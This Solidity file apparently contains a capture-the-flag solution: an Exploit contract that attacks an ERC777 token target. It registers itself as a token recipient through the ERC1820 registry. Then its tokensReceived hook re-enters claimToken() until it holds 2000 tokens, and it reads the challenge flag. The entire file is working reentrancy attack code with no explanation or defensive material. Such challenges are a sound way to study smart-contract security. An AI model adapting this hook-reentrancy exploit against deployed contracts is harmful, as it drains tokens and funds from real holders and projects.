// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

contract ERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external {}
}

contract ERC777 {
    function balanceOf(address tokenHolder) public view returns (uint256) {}
    function getFlag() public view returns(string memory) {}
    function claimToken() public payable {}
}

contract Exploit {
    address public owner;
    address public target;
    string public flag;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
        ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(0), 
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    function attack() payable public {
        address _target = target;
        require(msg.sender == owner, "onlyOwner");
        require(msg.value == 0.1 ether, "need exactly 0.1 ether");
        _target.call{value: 0.1 ether}("");
        require(ERC777(_target).balanceOf(address(this)) >= 2000 * 10**18, "reentrant failed");
        flag = ERC777(_target).getFlag();
    }

    function tokensReceived(address, address, address, uint256, bytes memory, bytes memory) public {
        address _target = target;
        if (ERC777(_target).balanceOf(address(this)) < 2000 * 10**18) {
            ERC777(_target).claimToken();
        }
    }
}
